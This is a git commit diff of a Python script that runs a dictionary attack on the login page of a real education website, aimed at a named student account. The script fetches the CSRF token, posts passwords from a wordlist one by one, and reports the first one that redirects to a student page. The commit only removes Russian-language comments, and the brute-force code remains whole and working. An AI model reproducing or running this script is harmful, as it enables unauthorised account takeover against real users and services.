51313125625eaf5a087dacb93a107adb8b092379
Man9sua <161411954+Man9sua@users.noreply.github.com>
2025-05-25 18:35:19 +0500

    Update dicattacksus10.py

--- dicattacksus10.py
+++ dicattacksus10.py
@@ -2,54 +2,49 @@ import requests
 from bs4 import BeautifulSoup
 import time
 
-# URL для логина
 login_url = 'https://eduway.kz/login'
 username = "Mansua"
 password_file = "pythonprjcts/workingforce/passs.txt"
 
-# Запускаем таймер
 start_time = time.time()
 
-# Используем сессию для сохранения куки и других данных
 session = requests.Session()
 
-# Функция для получения CSRF токена
 def get_login_token(session):
     response = session.get(login_url)
     soup = BeautifulSoup(response.text, 'html.parser')
     
-    # Ищем скрытое поле для CSRF-токена
     csrf_token = soup.find('input', {'name': '_csrf'})
     
-    # Если находим токен, возвращаем его значение, иначе None
+
     return csrf_token['value'] if csrf_token else None
 
-# Функция для попытки авторизации
+
 def attempt_login(session, username, password):
-    # Получаем CSRF токен перед отправкой POST-запроса
+
     csrf_token = get_login_token(session)
     
-    # Формируем данные для отправки
+
     data = {
         'username': username,
         'password': password,
-        '_csrf': csrf_token  # Добавляем токен CSRF
+        '_csrf': csrf_token  
     }
     
-    # Отправляем POST-запрос с включенными редиректами
+ 
     response = session.post(login_url, data=data, allow_redirects=True)
     
-    # Проверяем конечный URL после всех редиректов
+  
     print(f"Final URL after login attempt: {response.url}")
     
-    # Если после входа перенаправили на страницу студента
+
     if 'student' in response.url:
         print(f"Login successful with password: {password}")
         end_time = time.time()
         elapsed_time = end_time - start_time
         print(f"Время поиска пароля: {elapsed_time:.2f} секунд")
         return True
-    # Если страница вернула ошибку или URL указывает на ошибку
+
     elif 'login?error' in response.url or 'Неверные учетные данные' in response.text:
         print("Login failed: wrong username or password.")
         return False
@@ -57,7 +52,7 @@ def attempt_login(session, username, password):
         print("Unexpected response for login attempt.")
         return False
 
-# Функция для словарной атаки
+
 def dictionary_attack(username, password_file):
     with open(password_file, 'r') as file:
         for password in file:
@@ -69,7 +64,6 @@ def dictionary_attack(username, password_file):
     print("Password not found.")
     return None
 
-# Запуск атаки
 found_password = dictionary_attack(username, password_file)
 
 if found_password:
